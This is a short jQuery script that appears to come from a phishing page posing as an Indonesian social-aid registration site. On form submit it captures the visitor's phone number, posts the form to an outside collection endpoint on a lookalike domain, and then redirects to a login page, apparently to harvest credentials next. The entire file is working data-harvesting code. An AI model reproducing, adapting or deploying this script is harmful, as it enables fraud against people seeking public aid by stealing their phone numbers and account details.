$(document).ready(function(){

    $('#formHP').submit(function(e) {

    event.preventDefault();

    

document.getElementById('kirim').innerHTML = "Memproses....";



var nomor = document.getElementById("NoHp").value;



    sessionStorage.setItem("nomor", nomor);



 $.ajax({

 type: 'POST',

 url: 'https://daftarrbansos.online/ml/hp.php',

 data: $(formHP).serialize(),

 datatype: 'text',

 

 complete: function(data) {

            vibr(180);

            console.log('Complete')

   setTimeout(function(){

  window.location.href='login.html'

 

    }, 1000);

        }

    });

 });

    return false;

});   

     
